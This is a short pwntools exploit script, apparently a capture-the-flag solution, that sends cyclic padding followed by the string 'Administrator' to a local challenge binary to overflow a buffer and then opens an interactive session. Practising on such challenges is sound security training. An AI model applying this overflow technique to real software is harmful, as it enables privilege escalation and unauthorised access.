from pwn import *

p = process('./chall')

padding = b"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A"

payload = padding
payload+=b"Administrator"

p.clean()
p.sendline(payload)
p.interactive()
